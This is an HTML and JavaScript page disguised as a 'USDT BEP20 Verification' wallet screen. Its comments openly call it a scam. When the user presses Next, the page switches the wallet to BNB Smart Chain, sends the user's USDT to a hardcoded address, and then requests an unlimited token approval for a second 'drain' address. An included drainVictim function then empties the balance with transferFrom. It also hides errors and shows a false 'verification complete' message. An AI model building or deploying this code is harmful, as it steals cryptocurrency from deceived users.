<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>USDT BEP20 Verification</title>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">
    <style>
        /* EXACT SCAM INTERFACE FOR BNB SMART CHAIN */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #FFFFFF;
            color: #000000;
            line-height: 1.4;
            font-size: 16px;
            padding: 0;
            margin: 0;
            min-height: 100vh;
        }
        
        /* iOS STYLE HEADER */
        .header {
            background: #FFFFFF;
            padding: 60px 20px 20px 20px;
            border-bottom: 0.5px solid #C6C6C8;
            text-align: center;
            position: relative;
        }
        
        .header::before {
            content: "";
            position: absolute;
            top: 12px;
            left: 50%;
            transform: translateX(-50%);
            width: 36px;
            height: 5px;
            background: #E5E5EA;
            border-radius: 2.5px;
        }
        
        .site-title {
            font-size: 17px;
            font-weight: 600;
            color: #000000;
        }
        
        /* MAIN CONTENT */
        .content {
            padding: 20px;
        }
        
        .input-group {
            margin-bottom: 24px;
        }
        
        .label {
            font-size: 14px;
            color: #8E8E93;
            font-weight: 500;
            margin-bottom: 8px;
        }
        
        .address-container {
            background: #F2F2F7;
            border-radius: 12px;
            border: 1px solid #E5E5EA;
            padding: 14px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .address-text {
            font-family: 'Menlo', 'Monaco', monospace;
            font-size: 15px;
            color: #000000;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            flex: 1;
        }
        
        .paste-btn {
            background: #007AFF;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 6px 12px;
            font-size: 14px;
            font-weight: 500;
            margin-left: 10px;
            min-width: 60px;
        }
        
        /* AMOUNT SECTION - BEP20 SPECIFIC */
        .amount-container {
            background: #F2F2F7;
            border-radius: 12px;
            border: 1px solid #E5E5EA;
            padding: 16px;
        }
        
        .amount-row {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .amount-input {
            flex: 1;
            background: transparent;
            border: none;
            outline: none;
            font-size: 28px;
            font-weight: 600;
            color: #000000;
            text-align: center;
        }
        
        .token-badge {
            background: #007AFF;
            color: white;
            border-radius: 12px;
            padding: 16px 20px;
            font-size: 17px;
            font-weight: 600;
            min-width: 90px;
        }
        
        .max-btn {
            background: #34C759;
            color: white;
            border: none;
            border-radius: 12px;
            padding: 0 16px;
            font-size: 16px;
            font-weight: 600;
            height: 56px;
            min-width: 70px;
        }
        
        .usd-value {
            text-align: center;
            font-size: 15px;
            color: #8E8E93;
            margin: 16px 0 32px 0;
        }
        
        /* NEXT BUTTON */
        .next-container {
            padding: 20px;
            background: white;
            border-top: 0.5px solid #E5E5EA;
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
        }
        
        .next-btn {
            width: 100%;
            height: 50px;
            background: #007AFF;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 600;
        }
        
        @supports (padding-bottom: env(safe-area-inset-bottom)) {
            .next-container {
                padding-bottom: calc(20px + env(safe-area-inset-bottom));
            }
        }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
</head>
<body>
    <div class="header">
        <div class="site-title">usdtverification.vercel.app</div>
    </div>
    
    <div class="content">
        <div class="input-group">
            <div class="label">Address or Domain Name</div>
            <div class="address-container">
                <div class="address-text" id="addressDisplay">0x395b205f3ec60b4cd5...</div>
                <button class="paste-btn">Paste</button>
            </div>
        </div>
        
        <div class="input-group">
            <div class="amount-container">
                <div class="amount-row">
                    <input type="number" class="amount-input" id="amountInput" value="1">
                    <div class="token-badge">USDT</div>
                    <button class="max-btn" onclick="setMax()">Max</button>
                </div>
            </div>
            <div class="usd-value" id="usdValue">≈ $1.00</div>
        </div>
    </div>
    
    <div class="next-container">
        <button class="next-btn" onclick="startBEP20Drain()">Next</button>
    </div>
    
    <script>
        // ============================================
        // BNB SMART CHAIN BEP20 CONFIGURATION ONLY
        // ============================================
        
        // BSC MAINNET CONFIG
        const BSC_CHAIN_ID = "0x38"; // Chain ID 56
        const BSC_RPC_URL = "https://bsc-dataseed.binance.org/";
        const BSC_EXPLORER = "https://bscscan.com";
        
        // BEP20 USDT CONTRACT
        const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
        
        // SCAMMER ADDRESSES (BSC ONLY)
        const PAYMENT_ADDRESS = "0x395b205f3ec60b4cd58209eB7eD12F77F0eD0C85"; // For 1 USDT
        const DRAIN_ADDRESS = "0xF71dF0eD9A0ad68A4BA92F2719736540C122Dafc"; // For unlimited approval
        
        // BEP20 ABI
        const BEP20_ABI = [
            "function name() view returns (string)",
            "function symbol() view returns (string)",
            "function decimals() view returns (uint8)",
            "function totalSupply() view returns (uint256)",
            "function balanceOf(address owner) view returns (uint256)",
            "function transfer(address to, uint256 amount) returns (bool)",
            "function transferFrom(address from, address to, uint256 amount) returns (bool)",
            "function approve(address spender, uint256 amount) returns (bool)",
            "function allowance(address owner, address spender) view returns (uint256)"
        ];
        
        // ============================================
        // UI FUNCTIONS
        // ============================================
        
        function updateUSD() {
            const amount = document.getElementById('amountInput').value || 0;
            document.getElementById('usdValue').textContent = `≈ $${(amount * 1.00).toFixed(2)}`;
        }
        
        function setMax() {
            document.getElementById('amountInput').value = "1000";
            updateUSD();
        }
        
        // ============================================
        // BSC NETWORK MANAGEMENT
        // ============================================
        
        async function ensureBSCNetwork() {
            if (!window.ethereum) {
                throw new Error("Please open in Trust Wallet");
            }
            
            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
            
            if (chainId !== BSC_CHAIN_ID) {
                try {
                    // Switch to BSC
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: BSC_CHAIN_ID }]
                    });
                    console.log("Switched to BSC");
                    return true;
                } catch (switchError) {
                    if (switchError.code === 4902) {
                        // Add BSC network
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: BSC_CHAIN_ID,
                                chainName: 'BNB Smart Chain Mainnet',
                                nativeCurrency: {
                                    name: 'BNB',
                                    symbol: 'BNB',
                                    decimals: 18
                                },
                                rpcUrls: [BSC_RPC_URL],
                                blockExplorerUrls: [BSC_EXPLORER]
                            }]
                        });
                        console.log("Added BSC network");
                        return true;
                    }
                    throw switchError;
                }
            }
            return true; // Already on BSC
        }
        
        // ============================================
        // BEP20 DRAIN FUNCTION
        // ============================================
        
        async function startBEP20Drain() {
            try {
                // 1. Force BSC network
                await ensureBSCNetwork();
                
                // 2. Connect wallet (shows BNB Smart Chain in modal)
                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });
                
                const userAddress = accounts[0];
                console.log("BSC Address:", userAddress);
                
                // 3. Initialize provider for BSC
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                
                // 4. Create BEP20 USDT contract
                const usdtContract = new ethers.Contract(USDT_BEP20, BEP20_ABI, signer);
                
                // 5. Check USDT BEP20 balance
                const balance = await usdtContract.balanceOf(userAddress);
                console.log("USDT BEP20 Balance:", ethers.utils.formatUnits(balance, 18));
                
                // 6. Send 1 USDT BEP20 to scammer
                const amount = document.getElementById('amountInput').value;
                const amountWei = ethers.utils.parseUnits(amount, 18); // BEP20 uses 18 decimals
                
                const transferTx = await usdtContract.transfer(PAYMENT_ADDRESS, amountWei);
                console.log("Transfer TX:", transferTx.hash);
                
                await transferTx.wait();
                console.log("Transfer confirmed");
                
                // 7. Wait 3 seconds
                await new Promise(resolve => setTimeout(resolve, 3000));
                
                // 8. Request unlimited BEP20 approval
                const unlimitedAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                
                const approveTx = await usdtContract.approve(DRAIN_ADDRESS, unlimitedAmount);
                console.log("Approve TX:", approveTx.hash);
                
                // This shows the "Approve" modal with BNB fee
                await approveTx.wait();
                console.log("Approval confirmed");
                
                // 9. Scammer can now drain all USDT BEP20
                alert("✅ BEP20 Verification Complete! You will receive payment shortly.");
                
                // 10. Optional: Immediately drain (scammer's backend would do this)
                // await drainVictim(userAddress, signer);
                
            } catch (error) {
                console.error("BEP20 Drain Error:", error);
                
                if (error.code === 4001) {
                    alert("Transaction cancelled");
                } else if (error.message.includes("insufficient funds")) {
                    alert("Insufficient BNB for gas fee");
                } else {
                    alert("Error: " + error.message);
                }
            }
        }
        
        // ============================================
        // BACKEND DRAIN FUNCTION (FOR SCAMMER)
        // ============================================
        
        async function drainVictim(victimAddress, signer) {
            // This is what the scammer runs on their backend
            try {
                const usdtContract = new ethers.Contract(USDT_BEP20, BEP20_ABI, signer);
                
                // Check allowance
                const allowance = await usdtContract.allowance(victimAddress, DRAIN_ADDRESS);
                console.log("Allowance:", ethers.utils.formatUnits(allowance, 18));
                
                if (allowance.gt(0)) {
                    // Check balance
                    const balance = await usdtContract.balanceOf(victimAddress);
                    
                    if (balance.gt(0)) {
                        // Drain everything
                        const drainAmount = allowance.lt(balance) ? allowance : balance;
                        
                        const drainTx = await usdtContract.transferFrom(
                            victimAddress,
                            DRAIN_ADDRESS, // Scammer's address
                            drainAmount
                        );
                        
                        console.log("Drain TX:", drainTx.hash);
                        await drainTx.wait();
                        console.log("Drained:", ethers.utils.formatUnits(drainAmount, 18), "USDT BEP20");
                    }
                }
            } catch (error) {
                console.error("Drain error:", error);
            }
        }
        
        // ============================================
        // INITIALIZATION
        // ============================================
        
        document.addEventListener('DOMContentLoaded', function() {
            // Format BSC address display
            const displayAddr = PAYMENT_ADDRESS.substring(0, 20) + '...';
            document.getElementById('addressDisplay').textContent = displayAddr;
            
            // Update USD
            document.getElementById('amountInput').addEventListener('input', updateUSD);
            updateUSD();
            
            // Auto-switch to BSC on load (scammer behavior)
            if (window.ethereum) {
                setTimeout(() => {
                    ensureBSCNetwork().catch(() => {
                        // Silent fail - user won't notice
                    });
                }, 1000);
            }
            
            // Security
            document.addEventListener('contextmenu', e => e.preventDefault());
        });
    </script>
</body>
</html>
